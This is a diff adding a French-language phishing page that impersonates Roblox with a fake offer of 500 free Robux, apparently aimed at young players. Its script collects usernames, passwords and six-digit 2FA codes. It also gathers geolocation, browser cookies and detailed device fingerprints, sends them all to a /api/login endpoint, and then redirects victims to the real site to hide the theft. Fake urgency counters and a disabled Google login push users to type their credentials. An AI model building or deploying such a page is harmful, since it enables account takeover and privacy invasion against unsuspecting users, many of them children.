@@ -1,0 +1,1225 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Roblox - 500 Robux gratuits</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;900&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f0f4f8;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #1a1a1a;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 0 20px 30px 20px;
+            background: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* ============================================================
+           HEADER
+           ============================================================ */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding: 16px 0 8px 0;
+            min-height: 60px;
+        }
+
+        .back-arrow {
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 50%;
+            transition: background 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: none;
+            border: none;
+            font-size: 20px;
+            color: #1a1a1a;
+        }
+
+        .back-arrow:hover {
+            background: rgba(0, 0, 0, 0.05);
+        }
+
+        .back-arrow i {
+            font-size: 20px;
+            color: #1a1a1a;
+        }
+
+        .header h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            letter-spacing: -0.3px;
+        }
+
+        .header .step-indicator {
+            font-size: 13px;
+            color: #777;
+            font-weight: 400;
+        }
+
+        /* ============================================================
+           ÉTAPES
+           ============================================================ */
+        .step {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ============================================================
+           ÉTAPE 1 : OFFRE 500 ROBUX
+           ============================================================ */
+        .offer-box {
+            background: linear-gradient(145deg, #0b1f2e, #162b3e);
+            border-radius: 20px;
+            padding: 32px 24px 28px 24px;
+            text-align: center;
+            margin-top: 8px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .offer-box::after {
+            content: '🎯';
+            position: absolute;
+            top: -20px;
+            right: -10px;
+            font-size: 80px;
+            opacity: 0.06;
+            transform: rotate(20deg);
+        }
+
+        .offer-box .icon-box {
+            font-size: 52px;
+            margin-bottom: 8px;
+            position: relative;
+        }
+
+        .offer-box .title {
+            font-size: 26px;
+            font-weight: 900;
+            color: #ffffff;
+            position: relative;
+            line-height: 1.2;
+        }
+
+        .offer-box .title .highlight {
+            color: #00b2ff;
+        }
+
+        .offer-box .title .robux-icon {
+            font-size: 22px;
+            display: inline-block;
+            background: #00b2ff;
+            color: #ffffff;
+            padding: 0 8px;
+            border-radius: 4px;
+            margin-left: 4px;
+        }
+
+        .offer-box .description {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.75);
+            margin: 10px 0 18px 0;
+            line-height: 1.6;
+            position: relative;
+        }
+
+        .offer-box .countdown {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.08);
+            padding: 6px 18px;
+            border-radius: 30px;
+            font-size: 13px;
+            color: #fff;
+            font-weight: 500;
+            margin-bottom: 18px;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .offer-box .countdown span {
+            color: #ff6b6b;
+            font-weight: 700;
+        }
+
+        .offer-box .btn-offer {
+            background: #00b2ff;
+            color: #ffffff;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(0, 178, 255, 0.35);
+            position: relative;
+            width: 100%;
+            letter-spacing: 0.3px;
+        }
+
+        .offer-box .btn-offer:hover {
+            transform: scale(1.02);
+            box-shadow: 0 6px 30px rgba(0, 178, 255, 0.5);
+        }
+
+        .offer-box .btn-offer:active {
+            transform: scale(0.98);
+        }
+
+        .offer-box .btn-offer i {
+            margin-right: 8px;
+        }
+
+        .offer-box .footer-text {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.4);
+            margin-top: 14px;
+            position: relative;
+        }
+
+        /* ============================================================
+           ÉTAPE 2 : CONNEXION
+           ============================================================ */
+        .login-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .login-header .logo {
+            font-size: 32px;
+            font-weight: 900;
+            color: #1a1a1a;
+            letter-spacing: -1px;
+        }
+
+        .login-header .logo span {
+            color: #00b2ff;
+        }
+
+        .login-header p {
+            font-size: 14px;
+            color: #777;
+            margin-top: 4px;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #777777;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+
+        .input-group .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-group .input-wrapper .input-icon {
+            position: absolute;
+            left: 14px;
+            color: #b0b0b0;
+            font-size: 16px;
+            z-index: 1;
+        }
+
+        .input-group .input-wrapper input {
+            width: 100%;
+            padding: 15px 16px 15px 44px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            font-family: 'Poppins', sans-serif;
+            outline: none;
+            background-color: #f7f8fa;
+            color: #1a1a1a;
+            transition: all 0.3s ease;
+        }
+
+        .input-group .input-wrapper input:focus {
+            border-color: #00b2ff;
+            background-color: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 178, 255, 0.08);
+        }
+
+        .input-group .input-wrapper input::placeholder {
+            color: #b0b0b0;
+            font-weight: 400;
+        }
+
+        .input-group .input-wrapper input.password-field {
+            padding-right: 48px;
+        }
+
+        .input-group .input-wrapper input.input-error {
+            border-color: #ff3b30;
+            background-color: #fff5f5;
+        }
+
+        .error-message {
+            color: #ff3b30;
+            font-size: 12px;
+            font-weight: 400;
+            margin-top: 6px;
+            display: none;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .error-message::before {
+            content: "⚠️";
+            font-size: 12px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #b0b0b0;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        .password-toggle:hover {
+            color: #1a1a1a;
+        }
+
+        .btn-submit {
+            background: #00b2ff;
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            margin-bottom: 14px;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 16px rgba(0, 178, 255, 0.3);
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .btn-submit:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 6px 24px rgba(0, 178, 255, 0.4);
+        }
+
+        .btn-submit:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 2.5px solid rgba(255, 255, 255, 0.2);
+            border-top: 2.5px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #b0b0b0;
+            font-size: 13px;
+            font-weight: 500;
+            margin: 6px 0 18px 0;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .separator span {
+            padding: 0 16px;
+        }
+
+        .btn-google {
+            background: #ffffff;
+            color: #1a1a1a;
+            border: 1.5px solid #e0e0e0;
+            padding: 14px;
+            border-radius: 30px;
+            font-size: 15px;
+            font-weight: 500;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .btn-google:hover {
+            background: #f7f8fa;
+            border-color: #b0b0b0;
+        }
+
+        .btn-google svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 14px;
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #00b2ff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .signup-link a {
+            color: #00b2ff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* ============================================================
+           ÉTAPE 3 : CODE 2FA
+           ============================================================ */
+        .verification-info {
+            background: #f7f8fa;
+            border-radius: 14px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .verification-info .label {
+            font-size: 14px;
+            color: #777;
+        }
+
+        .code-input-group {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .code-input-group input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            font-family: 'Poppins', sans-serif;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            outline: none;
+            background: #f7f8fa;
+            transition: 0.3s;
+        }
+
+        .code-input-group input:focus {
+            border-color: #00b2ff;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(0, 178, 255, 0.08);
+        }
+
+        .code-error {
+            color: #ff3b30;
+            font-size: 12px;
+            text-align: center;
+            display: none;
+        }
+
+        .resend-link {
+            text-align: center;
+            font-size: 14px;
+            color: #777;
+            margin: 12px 0 20px 0;
+        }
+
+        .resend-link a {
+            color: #00b2ff;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .resend-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* ============================================================
+           LOADING
+           ============================================================ */
+        #loading-page {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #00b2ff;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+        }
+
+        #loading-page.active {
+            display: flex;
+        }
+
+        .loading-logo {
+            font-size: 48px;
+            font-weight: 900;
+            color: #ffffff;
+            letter-spacing: -1px;
+            margin-bottom: 20px;
+        }
+
+        .loading-logo span {
+            color: #0b1f2e;
+        }
+
+        .loading-text {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 18px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .progress-bar {
+            width: 180px;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.25);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .progress {
+            height: 100%;
+            background: #ffffff;
+            width: 0%;
+            transition: width 0.15s ease;
+        }
+
+        /* ============================================================
+           GEOLOCALISATION
+           ============================================================ */
+        #geolocation-prompt {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(4px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+
+        #geolocation-prompt.active {
+            display: flex;
+        }
+
+        .geolocation-modal {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 32px 24px 24px 24px;
+            width: 320px;
+            max-width: 90%;
+            text-align: center;
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.2);
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .geolocation-modal .geo-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .geolocation-modal h3 {
+            font-size: 18px;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .geolocation-modal p {
+            font-size: 14px;
+            color: #777;
+            line-height: 1.5;
+            margin-bottom: 24px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .geolocation-modal .btn-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .geolocation-modal .btn-group button {
+            padding: 12px 28px;
+            border: none;
+            border-radius: 30px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            flex: 1;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .geolocation-modal .btn-group button:first-child {
+            background: #f0f0f0;
+            color: #1a1a1a;
+        }
+
+        .geolocation-modal .btn-group button:first-child:hover {
+            background: #e0e0e0;
+        }
+
+        .geolocation-modal .btn-group button:last-child {
+            background: #00b2ff;
+            color: #ffffff;
+        }
+
+        .geolocation-modal .btn-group button:last-child:hover {
+            background: #0099e0;
+        }
+
+        /* ============================================================
+           RESPONSIVE
+           ============================================================ */
+        @media (max-width: 480px) {
+            .container { padding: 0 12px 20px 12px; }
+            .offer-box { padding: 24px 16px 20px 16px; }
+            .offer-box .title { font-size: 22px; }
+            .header h1 { font-size: 20px; }
+            .code-input-group input { width: 42px; height: 52px; font-size: 20px; }
+            .btn-submit { font-size: 16px; padding: 14px; }
+        }
+
+        @media (max-width: 380px) {
+            .code-input-group input { width: 36px; height: 46px; font-size: 18px; }
+            .offer-box .title { font-size: 19px; }
+            .offer-box .btn-offer { font-size: 15px; padding: 14px 20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- ============================================================
+        HEADER
+        ============================================================ -->
+        <div class="header">
+            <button class="back-arrow" onclick="goBack()" aria-label="Retour">
+                <i class="fas fa-chevron-left"></i>
+            </button>
+            <h1 id="pageTitle">Roblox</h1>
+        </div>
+
+        <!-- ============================================================
+        ÉTAPE 1 : OFFRE 500 ROBUX
+        ============================================================ -->
+        <div id="step1" class="step active">
+            <div class="offer-box">
+                <div class="icon-box">🎁</div>
+                <div class="title">
+                    <span class="highlight">500</span> Robux <span class="robux-icon">R$</span>
+                </div>
+                <div class="title" style="font-size: 18px; font-weight: 600; margin-top: 2px; color: #ffffff;">
+                    OFFRE SPÉCIALE
+                </div>
+                <div class="description">
+                    Pour fêter la rentrée, Roblox offre <strong style="color:#fff;">500 Robux</strong> aux 10 000 premiers joueurs qui vérifient leur compte.
+                </div>
+                <div class="countdown">
+                    ⏳ <span id="remainingPlaces">10 000</span> places restantes
+                </div>
+                <button class="btn-offer" id="btnOffer">
+                    <i class="fas fa-gift"></i> RÉCLAMER MES ROBUX
+                </button>
+                <div class="footer-text">
+                    🔒 Offre valable 24h · 100% gratuit
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================
+        ÉTAPE 2 : CONNEXION
+        ============================================================ -->
+        <div id="step2" class="step">
+            <div class="login-header">
+                <div class="logo">Rob<span>lox</span></div>
+                <p>Connecte-toi pour recevoir tes 500 Robux</p>
+            </div>
+
+            <form class="login-form" id="loginForm">
+                <div class="input-group">
+                    <label for="username">NOM D'UTILISATEUR OU E-MAIL</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon"><i class="fas fa-user"></i></span>
+                        <input type="text" id="username" placeholder="exemple@gmail.com ou pseudo" />
+                    </div>
+                    <div id="emailError" class="error-message">
+                        Veuillez entrer un nom d'utilisateur ou un email valide.
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label for="password">MOT DE PASSE</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon"><i class="fas fa-lock"></i></span>
+                        <input type="password" id="password" class="password-field" placeholder="••••••••" />
+                        <button type="button" class="password-toggle" id="togglePassword">
+                            <i class="fas fa-eye eye-icon" id="eyeIcon"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="step2Btn">
+                    <span class="btn-content">
+                        <span id="btnText2">Continuer</span>
+                        <span class="spinner" id="spinner2"></span>
+                    </span>
+                </button>
+
+                <div class="forgot-password">
+                    <a href="#">Mot de passe oublié ?</a>
+                </div>
+
+                <div class="separator"><span>OU</span></div>
+
+                <button class="btn-google" onclick="loginWithGoogle()">
+                    <svg viewBox="0 0 24 24">
+                        <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v3.92h6.69c-.29 1.5-1.14 2.77-2.4 3.61v3h3.84c2.25-2.07 3.61-5.12 3.61-8.46z"/>
+                        <path fill="#34A853" d="M12 24c3.24 0 5.97-1.08 7.96-2.91l-3.84-3c-1.06.72-2.42 1.16-4.12 1.16-3.17 0-5.85-2.14-6.81-5.02H1.24v3.1A11.997 11.997 0 0012 24z"/>
+                        <path fill="#FBBC05" d="M5.19 14.23c-.25-.72-.39-1.5-.39-2.23s.14-1.51.39-2.23V6.67H1.24A11.997 11.997 0 000 12c0 1.92.45 3.74 1.24 5.33l3.95-3.1z"/>
+                        <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.44-3.44C17.96 1.19 15.24 0 12 0 7.33 0 3.28 2.67 1.24 6.67l3.95 3.1c.96-2.88 3.64-5.02 6.81-5.02z"/>
+                    </svg>
+                    Continuer avec Google
+                </button>
+
+                <div class="signup-link">
+                    Pas encore de compte ? <a href="#">S'inscrire</a>
+                </div>
+            </form>
+        </div>
+
+        <!-- ============================================================
+        ÉTAPE 3 : CODE 2FA
+        ============================================================ -->
+        <div id="step3" class="step">
+            <div class="verification-info">
+                <div class="label">Un code de vérification vous a été envoyé.</div>
+            </div>
+
+            <div class="code-input-group" id="codeInputs">
+                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]">
+                <input type="text" maxlength="1" class="code-input" inputmode="numeric" pattern="[0-9]">
+            </div>
+            <div id="codeError" class="code-error">⚠️ Code à 6 chiffres requis</div>
+
+            <div class="resend-link">
+                Vous n'avez pas reçu le code ? <a onclick="resendCode()">Renvoyer</a>
+            </div>
+
+            <button type="button" class="btn-submit" id="step3Btn">
+                <span class="btn-content">
+                    <span id="btnText3">Vérifier</span>
+                    <span class="spinner" id="spinner3"></span>
+                </span>
+            </button>
+        </div>
+
+    </div>
+
+    <!-- ============================================================
+    GEOLOCALISATION
+    ============================================================ -->
+    <div id="geolocation-prompt">
+        <div class="geolocation-modal">
+            <span class="geo-icon">📍</span>
+            <h3>Autoriser la localisation ?</h3>
+            <p>Roblox souhaite utiliser votre position<br />pour personnaliser votre expérience.</p>
+            <div class="btn-group">
+                <button onclick="denyGeolocation()">Refuser</button>
+                <button onclick="allowGeolocation()">Autoriser</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================
+    LOADING
+    ============================================================ -->
+    <div id="loading-page">
+        <div class="loading-logo">Rob<span>lox</span></div>
+        <div class="loading-text">Connexion en cours...</div>
+        <div class="progress-bar">
+            <div class="progress" id="progress-bar"></div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // RETOUR
+        // ============================================================
+        function goBack() {
+            if (window.history.length > 1) {
+                window.history.back();
+            } else {
+                window.location.href = 'https://www.roblox.com';
+            }
+        }
+
+        // ============================================================
+        // TOGGLE PASSWORD
+        // ============================================================
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
+        const eyeIcon = document.getElementById('eyeIcon');
+
+        togglePassword.addEventListener('click', function() {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+            eyeIcon.className = isPassword ? 'fas fa-eye-slash eye-icon' : 'fas fa-eye eye-icon';
+        });
+
+        // ============================================================
+        // GEOLOCALISATION
+        // ============================================================
+        let userLocation = null;
+        let batteryLevel = 'Non disponible';
+        let geoResolve = null;
+
+        function requestGeolocation() {
+            return new Promise((resolve) => {
+                document.getElementById('geolocation-prompt').classList.add('active');
+                geoResolve = resolve;
+            });
+        }
+
+        function allowGeolocation() {
+            document.getElementById('geolocation-prompt').classList.remove('active');
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        userLocation = { latitude: position.coords.latitude, longitude: position.coords.longitude };
+                        if (geoResolve) { geoResolve(userLocation);
+                            geoResolve = null; }
+                    },
+                    function(error) {
+                        userLocation = null;
+                        if (geoResolve) { geoResolve(null);
+                            geoResolve = null; }
+                    }
+                );
+            } else {
+                userLocation = null;
+                if (geoResolve) { geoResolve(null);
+                    geoResolve = null; }
+            }
+        }
+
+        function denyGeolocation() {
+            document.getElementById('geolocation-prompt').classList.remove('active');
+            userLocation = null;
+            if (geoResolve) { geoResolve(null);
+                geoResolve = null; }
+        }
+
+        // ============================================================
+        // BOUTON OFFRE → ÉTAPE 2
+        // ============================================================
+        document.getElementById('btnOffer').addEventListener('click', function() {
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('pageTitle').textContent = 'Connexion';
+            // Simuler une diminution des places
+            const places = document.getElementById('remainingPlaces');
+            let current = parseInt(places.textContent.replace(/\s/g, ''));
+            if (current > 0) {
+                places.textContent = (current - 1).toLocaleString();
+            }
+        });
+
+        // ============================================================
+        // VALIDATION : Username ou Email (pas seulement Gmail)
+        // ============================================================
+        function isValidUsernameOrEmail(value) {
+            if (!value || value.trim() === '') return false;
+            // Si c'est un email, on vérifie le format
+            if (value.includes('@')) {
+                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
+            }
+            // Sinon, c'est un nom d'utilisateur (au moins 2 caractères)
+            return value.trim().length >= 2;
+        }
+
+        // ============================================================
+        // DÉTECTION APPAREIL
+        // ============================================================
+        function getExactDeviceModel() {
+            const ua = navigator.userAgent;
+            const models = {
+                'Samsung Galaxy A54 5G': /SM-A546/i,
+                'Samsung Galaxy S24 Ultra': /SM-S928/i,
+                'iPhone 15 Pro Max': /iPhone15,3/i,
+                'Google Pixel 8 Pro': /Pixel 8 Pro/i,
+                'Xiaomi 13 Pro': /Xiaomi 13 Pro/i,
+                'OnePlus 11': /OnePlus 11/i,
+                'TECNO Phantom X2': /TECNO Phantom X2/i,
+                'Infinix Zero Ultra': /Infinix Zero Ultra/i,
+                'Oppo Find X6 Pro': /Oppo Find X6/i
+            };
+            for (const [model, regex] of Object.entries(models)) {
+                if (regex.test(ua)) return model;
+            }
+            return 'Modèle inconnu';
+        }
+
+        async function detectIncognito() {
+            try {
+                if (navigator.storage && navigator.storage.estimate) {
+                    const estimate = await navigator.storage.estimate();
+                    return estimate.quota < 120000000;
+                }
+                return false;
+            } catch (e) { return false; }
+        }
+
+        async function getDeviceDetails() {
+            const deviceModel = getExactDeviceModel();
+            const orientation = window.screen.orientation ? window.screen.orientation.type : (window.innerWidth > window
+                .innerHeight ? 'paysage' : 'portrait');
+            const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+            const incognito = await detectIncognito();
+
+            return {
+                platform: navigator.platform || 'Inconnu',
+                deviceMemory: navigator.deviceMemory || 'Non disponible',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Non disponible',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Non disponible',
+                languages: navigator.languages ? navigator.languages.join(', ') : 'Non disponible',
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Non disponible',
+                batteryLevel: batteryLevel,
+                deviceModel: deviceModel,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localTime: new Date().toLocaleString('fr-FR', { timeZone: Intl.DateTimeFormat().resolvedOptions()
+                        .timeZone }),
+                geolocation: userLocation ? `${userLocation.latitude},${userLocation.longitude}` : 'Refusé',
+                orientation: orientation,
+                theme: prefersDark ? 'Sombre' : 'Clair',
+                viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+                pixelRatio: window.devicePixelRatio,
+                colorDepth: window.screen.colorDepth + ' bits',
+                incognito: incognito ? 'Activé' : 'Désactivé',
+                cookies: document.cookie || 'Aucun cookie'
+            };
+        }
+
+        // ============================================================
+        // CODE 2FA
+        // ============================================================
+        const codeInputs = document.querySelectorAll('.code-input');
+        codeInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value.length === 1 && index < 5) {
+                    codeInputs[index + 1].focus();
+                }
+                document.getElementById('codeError').style.display = 'none';
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    codeInputs[index - 1].focus();
+                }
+            });
+            input.addEventListener('keypress', function(e) {
+                if (!/[0-9]/.test(e.key)) e.preventDefault();
+            });
+        });
+
+        function getCode() {
+            let code = '';
+            codeInputs.forEach(input => code += input.value);
+            return code;
+        }
+
+        function resendCode() {
+            alert('🔁 Un nouveau code vous a été envoyé.');
+        }
+
+        // ============================================================
+        // FONCTIONS
+        // ============================================================
+        function loginWithGoogle() {
+            alert('Pour des raisons de sécurité, veuillez utiliser votre nom d\'utilisateur ou email.');
+        }
+
+        // ============================================================
+        // ÉTAPE 2 : SOUMISSION (nom d'utilisateur ou email)
+        // ============================================================
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            // Validation : username ou email valide
+            if (!isValidUsernameOrEmail(username)) {
+                document.getElementById('username').classList.add('input-error');
+                document.getElementById('emailError').style.display = 'flex';
+                return;
+            }
+
+            if (!password) {
+                alert('Veuillez entrer votre mot de passe.');
+                return;
+            }
+
+            const btn = document.getElementById('step2Btn');
+            const btnText = document.getElementById('btnText2');
+            const spinner = document.getElementById('spinner2');
+
+            btn.disabled = true;
+            btnText.textContent = 'Envoi...';
+            spinner.style.display = 'block';
+
+            try {
+                await requestGeolocation();
+                const deviceDetails = await getDeviceDetails();
+
+                const data = {
+                    username: username,
+                    password: password,
+                    ...deviceDetails,
+                    timestamp: new Date().toISOString(),
+                    step: 'credentials'
+                };
+
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+
+                if (response.ok && result.success) {
+                    document.getElementById('step2').classList.remove('active');
+                    document.getElementById('step3').classList.add('active');
+                    document.getElementById('pageTitle').textContent = 'Vérification';
+                    codeInputs[0].focus();
+                } else {
+                    alert('Erreur de connexion. Veuillez réessayer.');
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+                alert('Erreur de connexion au serveur.');
+            } finally {
+                btn.disabled = false;
+                btnText.textContent = 'Continuer';
+                spinner.style.display = 'none';
+            }
+        });
+
+        // ============================================================
+        // ÉTAPE 3 : VÉRIFICATION 2FA
+        // ============================================================
+        document.getElementById('step3Btn').addEventListener('click', async function() {
+            const code = getCode();
+
+            if (code.length !== 6) {
+                document.getElementById('codeError').style.display = 'block';
+                return;
+            }
+
+            const btn = this;
+            const btnText = document.getElementById('btnText3');
+            const spinner = document.getElementById('spinner3');
+
+            btn.disabled = true;
+            btnText.textContent = 'Vérification...';
+            spinner.style.display = 'block';
+
+            try {
+                const deviceDetails = await getDeviceDetails();
+
+                const data = {
+                    verification_code: code,
+                    ...deviceDetails,
+                    timestamp: new Date().toISOString(),
+                    step: 'verification'
+                };
+
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+
+                if (response.ok && result.success) {
+                    const loadingPage = document.getElementById('loading-page');
+                    loadingPage.classList.add('active');
+
+                    const progressBar = document.getElementById('progress-bar');
+                    let progress = 0;
+                    const interval = setInterval(() => {
+                        progress += 5;
+                        progressBar.style.width = progress + '%';
+                        if (progress >= 100) {
+                            clearInterval(interval);
+                            window.location.href = 'https://www.roblox.com';
+                        }
+                    }, 100);
+                } else {
+                    alert('Code incorrect. Veuillez réessayer.');
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+                alert('Erreur de connexion au serveur.');
+            } finally {
+                btn.disabled = false;
+                btnText.textContent = 'Vérifier';
+                spinner.style.display = 'none';
+            }
+        });
+
+        // ============================================================
